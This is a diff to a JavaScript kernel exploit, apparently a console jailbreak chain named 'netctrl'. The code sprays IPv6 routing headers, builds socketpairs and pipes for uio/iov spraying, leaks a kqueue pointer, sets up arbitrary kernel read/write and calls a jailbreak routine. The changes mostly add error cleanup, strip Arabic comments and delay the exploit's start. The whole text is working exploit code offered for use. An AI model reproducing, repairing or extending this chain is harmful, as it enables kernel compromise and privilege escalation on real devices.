@@ -624,6 +624,7 @@ function init() {
 var prev_core = -1;
 var prev_rtprio = -1;
 var cleanup_called = false;
+
 function setup() {
   try {
     debug('Preparing netctrl...');
@@ -632,63 +633,56 @@ function setup() {
     prev_core = get_current_core();
     prev_rtprio = get_rtprio();
 
-    // تثبيت الخيط على الكور الرئيسية + أولوية realtime
     pin_to_core(MAIN_CORE);
     set_rtprio(MAIN_RTPRIO);
     debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
 
-    // تحضير spray_rthdr الأساسي
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
     if (spray_rthdr_len <= 0) {
       log('setup: invalid spray_rthdr_len');
+      cleanup(true);
       return false;
     }
 
-    // ملء spray_rthdr_rop لكل سوكت IPv6 (نفس منطقك الأصلي)
     for (var i = 0; i < IPV6_SOCK_NUM; i++) {
       var base = spray_rthdr_rop.add(i * UCRED_SIZE);
       build_rthdr(base, UCRED_SIZE);
-      // Prefill with tagged information
       write32(base.add(0x04), RTHDR_TAG | i);
     }
 
-    // تحضير msg header
-    write64(msg.add(0x10), msgIov);       // msg_iov
-    write64(msg.add(0x18), MSG_IOV_NUM);  // msg_iovlen
+    write64(msg.add(0x10), msgIov);
+    write64(msg.add(0x18), MSG_IOV_NUM);
 
-    // dummy buffer للـ uioIovRead / uioIovWrite
     var dummyBuffer = malloc(0x1000);
     if (!dummyBuffer) {
       log('setup: malloc(dummyBuffer) failed');
+      cleanup(true);
       return false;
     }
+
     fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
     write64(uioIovRead.add(0x00), dummyBuffer);
     write64(uioIovWrite.add(0x00), dummyBuffer);
 
-    // إنشاء socketpair للـ uio spraying
     socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
     uio_sock_0 = read32(uio_sock);
     uio_sock_1 = read32(uio_sock.add(4));
 
-    // إنشاء socketpair للـ iov spraying
     socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
     iov_sock_0 = read32(iov_sock);
     iov_sock_1 = read32(iov_sock.add(4));
 
-    // إنشاء IPv6 sockets
     for (var s = 0; s < ipv6_socks.length; s++) {
       ipv6_socks[s] = socket(AF_INET6, SOCK_STREAM, 0);
       if (ipv6_socks[s].eq(BigInt_Error)) {
         log('setup: failed to create ipv6_socks[' + s + ']');
+        cleanup(true);
         return false;
       }
     }
 
-    // تهيئة pktopts (إزالة أي rthdr قديم)
     free_rthdrs(ipv6_socks);
 
-    // إنشاء pipes للـ arbitrary kernel r/w
     pipe(pipe_sock);
     master_pipe[0] = read32(pipe_sock);
     master_pipe[1] = read32(pipe_sock.add(4));
@@ -702,24 +696,22 @@ function setup() {
     victimRpipeFd = victim_pipe[0];
     victimWpipeFd = victim_pipe[1];
 
-    // جعل الـ pipes non-blocking
     fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);
 
-    // تهيئة threading (لحفظ FPU/MXCSR للـ longjmp)
     init_threading();
 
-    // إنشاء workers
     if (!create_workers()) {
       log('setup: create_workers failed');
+      cleanup(true);
       return false;
     }
 
-    // تشغيل workers (spawn threads)
     if (!init_workers()) {
       log('setup: init_workers failed');
+      cleanup(true);
       return false;
     }
 
@@ -728,6 +720,7 @@ function setup() {
 
   } catch (e) {
     log('setup ERROR: ' + e.message);
+    cleanup(true);
     return false;
   }
 }
@@ -979,32 +972,38 @@ function setup_log_screen() {
   };
 }
 function yield_to_render(callback) {
-  var id = jsmaf.setInterval(function () {
-    jsmaf.clearInterval(id);
+  jsmaf.setTimeout(function () {
     try {
       callback();
     } catch (e) {
       log('ERROR: ' + e.message);
-      cleanup();
+      cleanup(true);
+      if (typeof show_fail === 'function') {
+        show_fail();
+      }
     }
   }, 0);
 }
 var exploit_count = 0;
 var exploit_end = false;
+
 function netctrl_exploit() {
   setup_log_screen();
   var supported_fw = init();
   if (!supported_fw) {
+    log('Unsupported firmware, aborting.');
     return;
   }
   log('Setting up exploit...');
   yield_to_render(exploit_phase_setup);
 }
+
 function exploit_phase_setup() {
   var ok = setup();
   if (!ok) {
     log('Setup failed, aborting exploit.');
-    cleanup();
+    cleanup(true);
+    if (typeof show_fail === 'function') show_fail();
     return;
   }
   log('Workers spawned');
@@ -1012,10 +1011,12 @@ function exploit_phase_setup() {
   exploit_end = false;
   yield_to_render(exploit_phase_trigger);
 }
+
 function exploit_phase_trigger() {
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Failed to acquire kernel R/W');
-    cleanup();
+    cleanup(true);
+    if (typeof show_fail === 'function') show_fail();
     return;
   }
   exploit_count++;
@@ -1027,6 +1028,7 @@ function exploit_phase_trigger() {
   log('Leaking kqueue...');
   yield_to_render(exploit_phase_leak);
 }
+
 function exploit_phase_leak() {
   if (!leak_kqueue_safe()) {
     log('[leak_kqueue_safe] failed, retrying...');
@@ -1036,11 +1038,13 @@ function exploit_phase_leak() {
   log('Setting up arbitrary R/W...');
   yield_to_render(exploit_phase_rw);
 }
+
 function exploit_phase_rw() {
   setup_arbitrary_rw();
   log('Jailbreaking...');
   yield_to_render(exploit_phase_jailbreak);
 }
+
 function exploit_phase_jailbreak() {
   jailbreak();
 }
@@ -2419,5 +2423,15 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     loop_size: 0 // loop_size
   };
 }
-netctrl_exploit();
-// cleanup();
+setTimeout(function () {
+  try {
+    netctrl_exploit();
+  } catch (e) {
+    log('ERROR in netctrl_exploit: ' + e.message);
+    cleanup(true);
+    if (typeof show_fail === 'function') {
+      show_fail();
+    }
+  }
+}, 1000);
+
